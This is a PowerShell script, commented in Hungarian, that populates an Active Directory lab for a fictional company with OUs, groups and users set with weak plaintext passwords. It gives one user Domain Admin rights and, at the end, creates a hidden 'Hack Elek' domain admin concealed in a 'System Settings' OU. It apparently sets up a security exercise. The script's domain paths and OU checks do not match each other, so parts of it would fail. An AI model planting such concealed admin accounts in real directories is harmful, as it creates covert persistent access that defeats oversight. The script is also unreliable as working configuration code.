# AD modul importálása 

Import-Module ActiveDirectory  

# Példa Organizational Units (OU) létrehozása a CodeTechSolutions struktúrával 

$ouBasePath = "OU=CodeTech,DC=CodeTechSolutions,DC=local"
$ouSocPath = "OU=SOC,$ouBasePath"  
$ouHrPath = "OU=HR,$ouBasePath"
$ouDevPath = "OU=Developer,$ouBasePath"

# CodeTechTeams OU és al-OU-k létrehozása 

try {
    New-ADOrganizationalUnit -Name "CodeTech" -Path "DC=CodeTechSolutions,DC=local" -ProtectedFromAccidentalDeletion $false 
    New-ADOrganizationalUnit -Name "SOC" -Path $ouBasePath -ProtectedFromAccidentalDeletion $false 
    New-ADOrganizationalUnit -Name "HR" -Path $ouBasePath -ProtectedFromAccidentalDeletion $false 
    New-ADOrganizationalUnit -Name "Developer" -Path $ouBasePath -ProtectedFromAccidentalDeletion $false 
} catch {
    Write-Host "OU létrehozási hiba: $_"
}

# SOC és HR csoportok létrehozása a CodeTechTeams struktúrában 

New-ADGroup -Name "SOC" -SamAccountName "SOC" -GroupScope Global -GroupCategory Security -Path $ouSocPath 
New-ADGroup -Name "HR" -SamAccountName "HR" -GroupScope Global -GroupCategory Security -Path $ouHrPath 
New-ADGroup -Name "Developer" -SamAccountName "Developer" -GroupScope Global -GroupCategory Security -Path $ouDevPath 
 
# Felhasználók létrehozása és csoportokhoz adása 

$users = @( 
@{Name="John Doe"; SamAccountName="john.doe"; UserPrincipalName="john.doe@codetechsolutions.com"; Password="UserPassword1"; Group="SOC"; Path=$ouSocPath},  
@{Name="Marie Curie"; SamAccountName="marie.curie"; UserPrincipalName="marie.curie@codetechsolutions.com"; Password="UserPassword2"; Group="HR"; Path=$ouHrPath}, 
@{Name="Abdirahman Swanson"; SamAccountName="abdirahman.swanson"; UserPrincipalName="abdirahman.swanson@codetechsolutions.com"; Password="UserPassword3"; Group="Developer"; Path=$ouDevPath},  
@{Name="Leslie Chase"; SamAccountName="leslie.chase"; UserPrincipalName="leslie.chase@codetechsolutions.com"; Password="UserPassword4"; Group="Developer"; Path=$ouDevPath},  
@{Name="Iestyn Bean"; SamAccountName="iestyn.bean"; UserPrincipalName="iestyn.bean@codetechsolutions.com"; Password="UserPassword5"; Group="Developer"; Path=$ouDevPath}, 
@{Name="Iwan English"; SamAccountName="iwan.english"; UserPrincipalName="iwan.english@codetechsolutions.com"; Password="UserPassword6"; Group="Developer"; Path=$ouDevPath},  
@{Name="Daniela Santos"; SamAccountName="daniela.santos"; UserPrincipalName="daniela.santos@codetechsolutions.com"; Password="UserPassword7"; Group="Developer"; Path=$ouDevPath},  
@{Name="Jayson Terry"; SamAccountName="jayson.terry"; UserPrincipalName="jayson.terry@codetechsolutions.com"; Password="UserPassword8"; Group="Developer"; Path=$ouDevPath},
@{Name="Simple Jack"; SamAccountName="simple.jack"; UserPrincipalName="simple.jack@codetechsolutions.com"; Password="UserPassword9"; Group="Developer"; Path=$ouDevPath} 
)  

foreach ($user in $users) {
    try {
        New-ADUser -Name $user.Name `
                    -SamAccountName $user.SamAccountName `
                    -UserPrincipalName $user.UserPrincipalName `
                    -Path $user.Path `
                    -AccountPassword (ConvertTo-SecureString -String $user.Password -AsPlainText -Force) `
                    -Enabled $true
        Add-ADGroupMember -Identity $user.Group -Members $user.SamAccountName
    } catch {
        Write-Host "Hiba történt $($user.Name) létrehozása során: $_"
    }
}

# simple.jack felhasználó hozzáadása a Domain Admins csoporthoz
try {
    Add-ADGroupMember -Identity "Domain Admins" -Members "simple.jack"
    Write-Host "simple.jack sikeresen hozzáadva a Domain Admins csoporthoz."
} catch {
    Write-Host "Hiba történt a simple.jack Domain Admins csoporthoz adása során: $_"
}


# Sys OU létrehozása a gyökér alatt rejtettként, csak ha nem létezik
$ouHiddenPath = "OU=System Settings,DC=ls2025,DC=local"

if (-not (Get-ADOrganizationalUnit -Filter {Name -eq "Sys"})) {
    try {
        New-ADOrganizationalUnit -Name "System Settings" -Path "DC=ls2025,DC=local" -ProtectedFromAccidentalDeletion $true
        Write-Host "System Settings OU sikeresen létrehozva."
    } catch {
        Write-Host "OU létrehozási hiba: $_"
    }
} else {
    Write-Host "Sys OU már létezik, továbblépés az ACL beállításra."
}

# Hack Elek rejtett felhasználó létrehozása és Domain Admins csoporthoz adása
try {
    New-ADUser -Name "Hack Elek" `
                -SamAccountName "hack.elek" `
                -UserPrincipalName "hack.elek@codetechsolutions.com" `
                -Path $ouHiddenPath `
                -AccountPassword (ConvertTo-SecureString -String "AlmaFa12345!" -AsPlainText -Force) `
                -Enabled $true
    Set-ADUser -Identity "hack.elek" -Add @{showInAdvancedViewOnly=$true}
    Add-ADGroupMember -Identity "Domain Admins" -Members "hack.elek"
    Write-Host "Hack Elek sikeresen létrehozva rejtett Domain Admin felhasználóként."
} catch {
    Write-Host "Hiba történt Hack Elek létrehozása során: $_"
}
